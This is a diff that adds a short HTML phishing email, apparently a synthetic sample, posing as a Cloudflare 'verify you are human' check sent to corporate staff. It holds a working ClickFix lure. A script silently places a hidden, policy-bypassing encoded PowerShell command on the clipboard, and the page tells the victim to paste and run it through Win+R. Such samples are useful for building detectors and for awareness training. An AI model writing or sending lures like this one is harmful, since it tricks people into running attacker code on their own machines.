@@ -1,0 +1,9 @@
+From: =?utf-8?B?Q2xvdWRmbGFyZQ==?= <security@verify-cdn-check.example>
+To: staff@corp.internal
+Date: Tue, 22 Sep 2026 10:10:00 +0800
+Message-ID: <0000-b29@synth.example>
+Subject: Verify you are human
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style='font-family:sans-serif;text-align:center'><h3>Verify you are human</h3><div style='border:1px solid #ccc;padding:20px;display:inline-block'><p style='font-family:monospace;background:#f5f5f5;padding:10px'>hU8sK2mN9pQ4rT7wY3</p><p>Press <b>Win + R</b>, then press <b>Ctrl+V</b>, then press <b>Enter</b></p><p style='font-size:11px;color:#999'>Verification ensures fair access for all users.</p></div><script>navigator.clipboard&&navigator.clipboard.writeText("powershell -w hidden -ep bypass -e SQBFAFgA")</script></body></html>
